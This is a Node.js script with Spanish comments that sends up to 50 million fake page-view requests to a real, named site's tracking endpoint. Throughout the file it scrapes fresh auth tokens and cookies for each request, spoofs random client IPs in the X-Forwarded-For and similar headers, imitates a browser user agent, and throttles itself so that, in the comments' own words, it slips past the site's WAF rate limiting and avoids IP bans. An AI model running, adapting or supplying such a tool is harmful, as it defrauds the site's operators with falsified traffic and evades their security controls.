/*
 * ROR World "STEADY FLOW" Sender 🚀
 * Logic: Fetch Token -> Post View (Cycle)
 * Mode: Low Concurrency + KeepAlive to bypass WAF Rate Limiting
 */

const https = require("https");
const dns = require("dns");

// --- CONFIGURACIÓN ---
const TOTAL_VISITAS = 50000000;
// IMPORTANTE: Mantenlo bajo (20-30). Si lo subes a 100, te bloquearán la IP de nuevo.
const MAX_CONCURRENCY = 25; 
const TARGET_HOST = "download.ror.world";
const TARGET_PATH = "/v1/track/add";

let TARGET_IP = null;

// Optimizamos el agente para reusar conexiones TCP y no abrir miles de sockets
const agent = new https.Agent({
  keepAlive: true, 
  keepAliveMsecs: 10000, // Mantener conexión abierta 10s
  maxSockets: MAX_CONCURRENCY,
  timeout: 5000
});

const LANGUAGES = ["english", "arabic", "chinese", "hindi", "spanish"];
const LANG_CODE_MAP = { 
    "arabic": "ar", "english": "en", "chinese": "zh-CN", 
    "hindi": "hi", "spanish": "es" 
};

function randomIP() {
  const octet1 = Math.floor(Math.random() * 220) + 1;
  if ([10, 127, 169, 172, 192].includes(octet1)) return randomIP();
  return `${octet1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}
const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];
const wait = (ms) => new Promise(r => setTimeout(r, ms));

// --- 1. OBTENER TOKEN ÚNICO + COOKIES ---
function getFreshCredentials(lang) {
    return new Promise((resolve) => {
        const req = https.get({
            hostname: TARGET_IP || TARGET_HOST,
            path: `/${lang}`,
            servername: TARGET_HOST,
            agent, // Reusamos conexión TCP
            headers: {
                "Host": TARGET_HOST,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Connection": "keep-alive"
            }
        }, (res) => {
            // Capturar cookies del servidor (importante para el WAF)
            const rawCookies = res.headers['set-cookie'];
            let cookieHeader = "";
            if (rawCookies) {
                 cookieHeader = rawCookies.map(c => c.split(';')[0]).join('; ');
            }

            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const match = data.match(/window\.AUTH_TOKEN\s*=\s*["'](.*?)["']/);
                if (match && match[1]) {
                    resolve({ token: match[1], cookie: cookieHeader });
                } else {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
    });
}

// --- 2. ENVIAR VISITA ---
function sendPageView(creds, lang, isoCode, ip) {
    return new Promise((resolve) => {
        if (!creds) { resolve(false); return; }

        const payload = JSON.stringify({ action: "page_view" });

        const req = https.request({
            hostname: TARGET_IP || TARGET_HOST,
            port: 443,
            path: TARGET_PATH,
            method: "POST",
            agent, // Reusamos conexión TCP
            headers: {
                "Host": TARGET_HOST,
                "Authorization": `Bearer ${creds.token}`,
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(payload),
                
                // Headers de suplantación de identidad
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
                "Client-IP": ip,
                
                // Cookies completas
                "Cookie": `${creds.cookie}; googtrans=/en/${isoCode}`,
                
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Origin": `https://${TARGET_HOST}`,
                "Referer": `https://${TARGET_HOST}/${lang}`,
                "Connection": "keep-alive"
            },
            servername: TARGET_HOST
        }, (res) => {
            const success = res.statusCode === 200;
            res.on('data', () => {}); // Consumir respuesta
            res.on('end', () => resolve(success));
        });

        req.on('error', () => resolve(false));
        req.on('timeout', () => { req.destroy(); resolve(false); });
        req.write(payload);
        req.end();
    });
}

// --- BUCLE DE TRABAJO ---
async function worker() {
    // Bucle infinito por worker
    while (true) {
        const lang = getRandom(LANGUAGES);
        const isoCode = LANG_CODE_MAP[lang] || "en";
        const ip = randomIP();

        try {
            // 1. Obtener credenciales
            const creds = await getFreshCredentials(lang);
            
            // 2. Enviar visita
            if (creds) {
                const success = await sendPageView(creds, lang, isoCode, ip);
                if (success) stats.success++;
                stats.processed++;
            }
        } catch (e) {
            // Ignorar errores puntuales
        }

        // PAUSA TÁCTICA: 
        // Esperamos entre 100ms y 500ms entre peticiones del mismo hilo.
        // Esto evita que saturemos la conexión.
        await wait(Math.random() * 400 + 100);
    }
}

// Stats Globales
const stats = { processed: 0, success: 0 };

function resolveDNS() {
    return new Promise((resolve) => {
        dns.lookup(TARGET_HOST, (err, address) => {
            if (err) console.log("⚠️ Fallo DNS, usando Hostname");
            else {
                TARGET_IP = address;
                console.log(`🔗 DNS Resuelto: ${TARGET_HOST} -> ${TARGET_IP}`);
            }
            resolve();
        });
    });
}

async function main() {
  await resolveDNS();
  console.log(`🚀 Iniciando STEADY FLOW Sender`);
  console.log(`🛡️  Estrategia: Baja Concurrencia (${MAX_CONCURRENCY}) + Pausa Aleatoria`);
  console.log(`🎯 Objetivo: ${TARGET_HOST}`);

  const start = Date.now();

  // Lanzar workers
  for (let i = 0; i < MAX_CONCURRENCY; i++) {
      worker(); 
      // Escalona el inicio de los workers para no pegar de golpe al inicio
      await wait(100); 
  }

  // Monitor de Progreso
  setInterval(() => {
      const seconds = (Date.now() - start) / 1000;
      const speed = (stats.success / seconds).toFixed(1);
      process.stdout.write(`\r⚡ Velocidad: ${speed} req/s | Enviados: ${stats.processed.toLocaleString()} | ✅ Éxito Real: ${stats.success.toLocaleString()}`);
  }, 1000);
}

main();